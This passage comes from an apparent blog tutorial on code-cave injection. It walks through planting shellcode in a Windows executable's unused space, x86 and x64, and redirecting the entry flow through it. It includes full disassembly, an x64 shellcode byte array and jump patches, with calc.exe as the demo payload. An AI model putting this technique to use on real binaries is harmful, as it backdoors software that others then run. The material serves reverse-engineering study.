+<span class="mo">00401</span><span class="n">D87</span> <span class="o">|</span> <span class="mo">01</span><span class="n">C7</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">edi</span><span class="p">,</span><span class="n">eax</span>                             <span class="o">|</span> <span class="n">edi</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D89</span> <span class="o">|</span> <span class="mi">897</span><span class="n">D</span> <span class="n">F8</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span><span class="n">edi</span>            <span class="o">|</span> <span class="n">edi</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D8C</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B4B</span> <span class="mi">24</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">24</span><span class="p">]</span>           <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D8F</span> <span class="o">|</span> <span class="mo">01</span><span class="n">C1</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">ecx</span><span class="p">,</span><span class="n">eax</span>                             <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D91</span> <span class="o">|</span> <span class="mi">894</span><span class="n">D</span> <span class="n">F4</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">C</span><span class="p">],</span><span class="n">ecx</span>            <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D94</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B53</span> <span class="mi">1</span><span class="n">C</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">1</span><span class="n">C</span><span class="p">]</span>           <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D97</span> <span class="o">|</span> <span class="mo">01</span><span class="n">C2</span>                     <span class="o">|</span> <span class="n">add</span> <span class="n">edx</span><span class="p">,</span><span class="n">eax</span>                             <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D99</span> <span class="o">|</span> <span class="mi">8955</span> <span class="n">F0</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="p">],</span><span class="n">edx</span>           <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D9C</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B53</span> <span class="mi">14</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">14</span><span class="p">]</span>           <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">D9F</span> <span class="o">|</span> <span class="mi">8955</span> <span class="n">EC</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">14</span><span class="p">],</span><span class="n">edx</span>           <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DA2</span> <span class="o">|</span> <span class="n">EB</span> <span class="mi">32</span>                    <span class="o">|</span> <span class="n">jmp</span> <span class="n">codecaving</span><span class="p">.</span><span class="mi">401</span><span class="n">DD6</span>                   <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DA4</span> <span class="o">|</span> <span class="mi">31</span><span class="n">C0</span>                     <span class="o">|</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>                             <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DA6</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B55</span> <span class="n">EC</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">14</span><span class="p">]</span>           <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DA9</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B7D</span> <span class="n">F8</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>            <span class="o">|</span> <span class="n">edi</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DAC</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B75</span> <span class="mi">18</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">18</span><span class="p">]</span>           <span class="o">|</span> <span class="n">esi</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DAF</span> <span class="o">|</span> <span class="mi">31</span><span class="n">C9</span>                     <span class="o">|</span> <span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>                             <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DB1</span> <span class="o">|</span> <span class="n">FC</span>                       <span class="o">|</span> <span class="n">cld</span>                                     <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DB2</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B3C87</span>                   <span class="o">|</span> <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">edi</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>        <span class="o">|</span> <span class="n">edi</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DB5</span> <span class="o">|</span> <span class="mo">037</span><span class="n">D</span> <span class="n">FC</span>                  <span class="o">|</span> <span class="n">add</span> <span class="n">edi</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>            <span class="o">|</span> <span class="n">edi</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DB8</span> <span class="o">|</span> <span class="mi">66</span><span class="o">:</span><span class="mi">83</span><span class="n">C1</span> <span class="mi">08</span>               <span class="o">|</span> <span class="n">add</span> <span class="n">cx</span><span class="p">,</span><span class="mi">8</span>                                <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DBC</span> <span class="o">|</span> <span class="n">F3</span><span class="o">:</span><span class="n">A6</span>                    <span class="o">|</span> <span class="n">repe</span> <span class="n">cmpsb</span>                              <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DBE</span> <span class="o">|</span> <span class="mi">74</span> <span class="mo">05</span>                    <span class="o">|</span> <span class="n">je</span> <span class="n">codecaving</span><span class="p">.</span><span class="mi">401</span><span class="n">DC5</span>                    <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DC0</span> <span class="o">|</span> <span class="mi">40</span>                       <span class="o">|</span> <span class="n">inc</span> <span class="n">eax</span>                                 <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DC1</span> <span class="o">|</span> <span class="mi">39</span><span class="n">D0</span>                     <span class="o">|</span> <span class="n">cmp</span> <span class="n">eax</span><span class="p">,</span><span class="n">edx</span>                             <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DC3</span> <span class="o">|</span> <span class="mi">72</span> <span class="n">E4</span>                    <span class="o">|</span> <span class="n">jb</span> <span class="n">codecaving</span><span class="p">.</span><span class="mi">401</span><span class="n">DA9</span>                    <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DC5</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B4D</span> <span class="n">F4</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">C</span><span class="p">]</span>            <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DC8</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B55</span> <span class="n">F0</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>           <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DCB</span> <span class="o">|</span> <span class="mi">66</span><span class="o">:</span><span class="mi">8</span><span class="n">B0441</span>                <span class="o">|</span> <span class="n">mov</span> <span class="n">ax</span><span class="p">,</span><span class="n">word</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">ecx</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>          <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DCF</span> <span class="o">|</span> <span class="mi">8</span><span class="n">B0482</span>                   <span class="o">|</span> <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[</span><span class="n">edx</span><span class="o">+</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>        <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DD2</span> <span class="o">|</span> <span class="mo">0345</span> <span class="n">FC</span>                  <span class="o">|</span> <span class="n">add</span> <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>            <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DD5</span> <span class="o">|</span> <span class="n">C3</span>                       <span class="o">|</span> <span class="n">ret</span>                                     <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DD6</span> <span class="o">|</span> <span class="n">BA</span> <span class="mi">78786563</span>              <span class="o">|</span> <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span><span class="mi">63657878</span>                        <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DDB</span> <span class="o">|</span> <span class="n">C1EA</span> <span class="mi">08</span>                  <span class="o">|</span> <span class="n">shr</span> <span class="n">edx</span><span class="p">,</span><span class="mi">8</span>                               <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DDE</span> <span class="o">|</span> <span class="mi">52</span>                       <span class="o">|</span> <span class="n">push</span> <span class="n">edx</span>                                <span class="o">|</span> <span class="n">edx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DDF</span> <span class="o">|</span> <span class="mi">68</span> <span class="mf">57696E45</span>              <span class="o">|</span> <span class="n">push</span> <span class="mf">456E6957</span>                           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DE4</span> <span class="o">|</span> <span class="mi">8965</span> <span class="mi">18</span>                  <span class="o">|</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">ss</span><span class="o">:</span><span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">18</span><span class="p">],</span><span class="n">esp</span>           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DE7</span> <span class="o">|</span> <span class="n">E8</span> <span class="n">B8FFFFFF</span>              <span class="o">|</span> <span class="n">call</span> <span class="n">codecaving</span><span class="p">.</span><span class="mi">401</span><span class="n">DA4</span>                  <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DEC</span> <span class="o">|</span> <span class="mi">31</span><span class="n">C9</span>                     <span class="o">|</span> <span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>                             <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DEE</span> <span class="o">|</span> <span class="mi">51</span>                       <span class="o">|</span> <span class="n">push</span> <span class="n">ecx</span>                                <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DEF</span> <span class="o">|</span> <span class="mi">68</span> <span class="mf">2E657865</span>              <span class="o">|</span> <span class="n">push</span> <span class="mi">6578652</span><span class="n">E</span>                           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DF4</span> <span class="o">|</span> <span class="mi">68</span> <span class="mi">63616</span><span class="n">C63</span>              <span class="o">|</span> <span class="n">push</span> <span class="mi">636</span><span class="n">C6163</span>                           <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DF9</span> <span class="o">|</span> <span class="mf">89E3</span>                     <span class="o">|</span> <span class="n">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>                             <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DFB</span> <span class="o">|</span> <span class="mi">41</span>                       <span class="o">|</span> <span class="n">inc</span> <span class="n">ecx</span>                                 <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DFC</span> <span class="o">|</span> <span class="mi">51</span>                       <span class="o">|</span> <span class="n">push</span> <span class="n">ecx</span>                                <span class="o">|</span> <span class="n">ecx</span><span class="o">:</span><span class="n">EntryPoint</span>
+<span class="mo">00401</span><span class="n">DFD</span> <span class="o">|</span> <span class="mi">53</span>                       <span class="o">|</span> <span class="n">push</span> <span class="n">ebx</span>                                <span class="o">|</span>
+<span class="mo">00401</span><span class="n">DFE</span> <span class="o">|</span> <span class="n">FFD0</span>                     <span class="o">|</span> <span class="n">call</span> <span class="n">eax</span>                                <span class="o">|</span>
+<span class="mf">00401E00</span> <span class="o">|</span> <span class="n">E8</span> <span class="n">A5020000</span>              <span class="o">|</span> <span class="n">call</span> <span class="n">codecaving</span><span class="p">.</span><span class="mi">4020</span><span class="n">AA</span>                  <span class="o">|</span> <span class="c1">// end of shellcode</span>
+</code></pre></div></div>
+
+<p>Now, after we pasted our shellcode, we need to modify our exe’s code so that we <code class="language-plaintext highlighter-rouge">jmp</code> to the address of the start of the shellcode (<code class="language-plaintext highlighter-rouge">00401D5D</code>),</p>
+
+<p>and then add a jmp instruction at the <em>end</em> of the shellcode to <code class="language-plaintext highlighter-rouge">jmp</code> back to the original execution flow (so that we don’t break the program).</p>
+
+<p>I chose this instruction to modify:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">jmp</span> <span class="mh">0x00401D14</span>
+</code></pre></div></div>
+<p>So first, let’s modify that instruction instruction to <code class="language-plaintext highlighter-rouge">jmp</code> to the start of our shellcode (at address <code class="language-plaintext highlighter-rouge">00401D5D</code>) instead of <code class="language-plaintext highlighter-rouge">00401D14</code></p>
+
+<p>So instead of <code class="language-plaintext highlighter-rouge">jmp 0x00401D14</code>, it will be <code class="language-plaintext highlighter-rouge">jmp 00401D5D</code>:
+<img src="/assets/images/injection/codecaves/oep.png" alt="Jumping to our shellcode" /></p>
+
+<p>And then at the end of our shellcode, we add a <code class="language-plaintext highlighter-rouge">jmp</code> instruction to the address that the original <code class="language-plaintext highlighter-rouge">jmp</code> was meant to jump to (<code class="language-plaintext highlighter-rouge">0x00401D14</code>):</p>
+
+<p><img src="/assets/images/injection/codecaves/end.png" alt="Jumping to our shellcode" /></p>
+
+<p>Now, after applying our patches in <code class="language-plaintext highlighter-rouge">x64dbg</code>, we can see that the program also launches <code class="language-plaintext highlighter-rouge">calc.exe</code> alongside its original payload:</p>
+
+<p><img src="/assets/images/injection/codecaves/success.png" alt="Successfully opening calc.exe" /></p>
+
+<h1 id="shellcode-injection-in-x64-processes">Shellcode injection in x64 processes</h1>
+
+<p>In x64, there’s no <code class="language-plaintext highlighter-rouge">pushad</code> or <code class="language-plaintext highlighter-rouge">pushfd</code> instruction; you’d have to manually push all of the general-purpose registers.</p>
+
+<p>So, in an x64 process, we’ll write these instructions before writing our shellcode:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push rbx
+push rcx
+push rdx
+push rsi
+push rdi
+push rbp
+push r8
+push r9
+push r10
+push r11
+push r12
+push r13
+push r14
+push r15
+</code></pre></div></div>
+<p><img src="/assets/images/injection/codecaves/x64shellcode.png" alt="Pushing x64 registers" /></p>
+
+<p>I will use this x64 shellcode to open <code class="language-plaintext highlighter-rouge">calc.exe</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">array</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+    <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span>
+    <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span>
+    <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span>
+    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+    <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span>
+    <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+    <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span>
+    <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span>
+    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span>
+    <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span>
+    <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span>
+    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xD6</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Let’s write this shellcode after the initial <code class="language-plaintext highlighter-rouge">push</code> instructions:</p>
+
+<p><img src="/assets/images/injection/codecaves/x64shellcode1.png" alt="Writing the shellcode" /></p>
+
+<p>After writing our shellcode, we’ll pop the general purpose registers:</p>
+
+<p><img src="/assets/images/injection/codecaves/pop.png" alt="Popping the registers" /></p>
+
+<p>Now, <strong>from somewhere within the actual process’s execution flow</strong>, we will have to jump to the start of our shellcode so that it gets executed.</p>
+
+<p>This is the starting instruction of our shellcode:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mo">00007</span><span class="n">FF6B14323F4</span> <span class="o">|</span> <span class="mi">53</span>                       <span class="o">|</span> <span class="n">push</span> <span class="n">rbx</span>                                <span class="o">|</span>
+</code></pre></div></div>
+<p>At address <code class="language-plaintext highlighter-rouge">00007FF6B1431408</code>, the Entry Point instruction is located. I will modify that instruction with a jmp to the start of our shellcode:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">jmp</span> <span class="mh">0x00007FF6B14323F4</span> <span class="c1">// this address contains the first instruction in our shellcode</span>
+</code></pre></div></div>
+<p><img src="/assets/images/injection/codecaves/modification.png" alt="Jumping to the start of the shellcode" /></p>
+
+<p>And, at the end, we jump back to the instruction that comes right after that initial jump we made, so the program continues as if nothing happened.</p>
+
+<p><img src="/assets/images/injection/codecaves/jumpingback.png" alt="Jump back to the instruction that comes right after that initial jump" /></p>
+
+<p>This is our our final shellcode looks like:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">push</span> <span class="n">rbx</span> <span class="c1">// &lt;--- manually pushing all of the general-purpose registers onto the stack (for preservation)</span>
+<span class="n">push</span> <span class="n">rcx</span>
+<span class="n">push</span> <span class="n">rdx</span>
+<span class="n">push</span> <span class="n">rsi</span>
+<span class="n">push</span> <span class="n">rdi</span>
+<span class="n">push</span> <span class="n">rbp</span>
